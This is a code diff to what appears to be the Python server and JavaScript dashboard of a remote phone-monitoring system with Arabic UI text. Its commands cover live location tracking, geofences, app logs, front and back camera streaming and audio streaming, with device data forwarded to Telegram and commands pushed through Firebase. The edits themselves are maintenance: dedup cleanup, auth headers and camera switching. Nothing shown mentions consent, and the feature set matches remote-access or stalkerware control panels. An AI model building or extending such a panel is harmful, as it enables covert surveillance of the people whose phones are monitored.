@@ -251,7 +251,6 @@ COMMAND_REGISTRY = {
     "get_app_log":      {"cat": "monitor", "cmd": "get_running_apps",          "desc": "📋 سجل التطبيقات",             "emoji": "📋"},
     "location_live":    {"cat": "monitor", "cmd": "location_live",        "desc": "🗺️ تتبع مباشر",               "emoji": "🗺️"},
     "location_stop":    {"cat": "monitor", "cmd": "location_stop",        "desc": "⏹️ إيقاف التتبع",             "emoji": "⏹️"},
-    "location_history": {"cat": "monitor", "cmd": "get_location",     "desc": "📜 سجل المواقع",              "emoji": "📜"},
     "geo_add":          {"cat": "monitor", "cmd": "get_location",              "desc": "➕ إضافة منطقة جغرافية",       "emoji": "➕"},
     "geo_remove":       {"cat": "monitor", "cmd": "get_location",           "desc": "➖ حذف منطقة جغرافية",         "emoji": "➖"},
     "geo_list":         {"cat": "monitor", "cmd": "get_location",             "desc": "📋 قائمة المناطق الجغرافية",   "emoji": "📋"},
@@ -667,7 +666,8 @@ def firebase_push_command(cmd):
         loop = asyncio.get_running_loop()
         loop.create_task(_firebase_push_cmd_async(cmd))
     except RuntimeError:
-        asyncio.run(_firebase_push_cmd_async(cmd))
+        # Not in async context, log warning
+        log.warning("firebase_push_command called outside async context")
 
 
 async def _firebase_push_cmd_async(cmd):
@@ -2112,6 +2112,10 @@ async def api_device_data_body(request):
         expired = [k for k, v in _data_body_dedup.items() if body_dedup_now - v.get("time", 0) > 300]
         for k in expired:
             del _data_body_dedup[k]
+        # Clean up old data_forward_dedup entries (older than 5 minutes)
+        fwd_expired = [k for k, v in _data_forward_dedup.items() if body_dedup_now - v > 300]
+        for k in fwd_expired:
+            del _data_forward_dedup[k]
 
         # === FORWARD DATA TO TELEGRAM ===
         try:
@@ -3021,13 +3025,13 @@ document.getElementById('sidebar').classList.remove('open');
 
 function updateClock(){
 const now=new Date();
-document.getElementById('clock').textContent=now.toLocaleString('en-US');
+document.getElementById('clock').textContent=now.toLocaleString('ar-SA');
 }
 setInterval(updateClock,1000);updateClock();
 
 function populateDeviceSelects(){
 const html=DEVICES.map(d=>`<option value="${d.id}">${d.name||d.id} (${d.active?'🟢':'🔴'})</option>`).join('');
-['cmdDevice','fileDevice','dataDevice','monDevice'].forEach(id=>{
+['cmdDevice','fileDevice','dataDevice','monDevice','streamDevice'].forEach(id=>{
 const el=document.getElementById(id);if(el)el.innerHTML=html;
 });
 }
@@ -3227,14 +3231,7 @@ let _firstFrameReceived=false;
 let _lastFrameData='';
 let _streamQuality=3;
 
-function populateStreamDeviceSelect(){
-const html=DEVICES.map(d=>'<option value="'+d.id+'">'+(d.name||d.id)+' ('+(d.active?'&#x1F7E2;':'&#x1F534;')+')</option>').join('');
-const el=document.getElementById('streamDevice');if(el)el.innerHTML=html;
-}
-const _origPopulate=populateDeviceSelects;
-populateDeviceSelects=function(){
-_origPopulate();populateStreamDeviceSelect();
-};
+
 
 function onStreamDeviceChange(){
 const devId=document.getElementById('streamDevice').value;
@@ -3319,10 +3316,11 @@ document.getElementById('stStatus').textContent='متوقف';
 async function switchCamera(){
 var devId=document.getElementById('streamDevice').value;
 if(!devId)return;
-await api('stream/jpeg_stop',{method:'POST',body:JSON.stringify({device_id:devId})});
-_streamType='camera';
-var r=await api('stream/jpeg_start',{method:'POST',body:JSON.stringify({device_id:devId,type:'camera',interval:3})});
-if(r.ok){_streamActive=true;_firstFrameReceived=false;_setViewerState('waiting');startStreamPolling(devId);}
+if(_streamType==='front_camera') _streamType='back_camera';
+else if(_streamType==='back_camera') _streamType='front_camera';
+else _streamType='camera';
+if(_streamActive){stopStream();setTimeout(function(){startStream();},500);}
+else{startStream();}
 notify('تم تبديل الكاميرا');
 }
 
@@ -3343,12 +3341,12 @@ _streamPollTimer=setInterval(async function(){
 if(!_streamActive)return;
 try{
 var typeParam=_streamType==='audio'?'audio':'video';
-var resp=await fetch('/api/stream/frame/'+devId+'?type='+typeParam);
+var resp=await fetch('/api/stream/frame/'+devId+'?type='+typeParam,{headers:{'Authorization':'Bearer '+TOKEN}});
 var r=await resp.json();
 if(r.ok&&r.data&&r.data.length>50){_onFrameReceived(r.data,false);}
 else if(r.ok&&_firstFrameReceived){}
 else if(!_firstFrameReceived){
-try{var sr=await fetch('/api/stream/status');var status=await sr.json();if(status.ok&&status.active_streams&&status.active_streams[devId]){if(!_firstFrameReceived)_setViewerState('connected');}else if(!_firstFrameReceived&&_streamActive){_setViewerState('waiting');}}catch(e){}
+try{var sr=await fetch('/api/stream/status',{headers:{'Authorization':'Bearer '+TOKEN}});var status=await sr.json();if(status.ok&&status.active_streams&&status.active_streams[devId]){if(!_firstFrameReceived)_setViewerState('connected');}else if(!_firstFrameReceived&&_streamActive){_setViewerState('waiting');}}catch(e){}
 }
 }catch(e){}
 },2000);
@@ -3380,7 +3378,7 @@ async def serve_dashboard(request):
 # ============================================================================
 
 async def tg_poll_loop():
-    global tg_offset, polling_active, _processed_update_ids, _processed_message_keys
+    global tg_offset, polling_active, _processed_update_ids, _processed_message_keys, _message_dedup, _chat_rate_counter, _data_forward_dedup
     polling_active = True
     
     # === تنظيف الاتصالات القديمة عند بدء التشغيل ===
@@ -3424,6 +3422,16 @@ async def tg_poll_loop():
                     await asyncio.sleep(2)
                 continue
             _conflict_count = 0  # إعادة العداد عند النجاح
+            
+            # Periodic cleanup (every 100 polls)
+            if not hasattr(tg_poll_loop, '_poll_count'):
+                tg_poll_loop._poll_count = 0
+            tg_poll_loop._poll_count += 1
+            if tg_poll_loop._poll_count % 100 == 0:
+                now = time.time()
+                _message_dedup = {k: v for k, v in _message_dedup.items() if now - v > 600}
+                _chat_rate_counter = {k: v for k, v in _chat_rate_counter.items() if v and now - v[-1] > 300}
+                _data_forward_dedup = {k: v for k, v in _data_forward_dedup.items() if now - v > 300}
             
             updates = result.get("result", [])
             for update in updates:
@@ -3830,6 +3838,11 @@ def create_app():
         global api_hits
         api_hits += 1
         try:
+            body = await request.json()
+            # Verify the device is registered
+            device_id = body.get("device_id", "")
+            if device_id and not find_device(device_id):
+                return web.json_response({"ok": False, "error": "Device not registered"}, status=403)
             entry = await generate_link_code()
             return web.json_response({"ok": True, "code": entry["code"], "session_id": entry.get("session_id", "")})
         except Exception as exc:
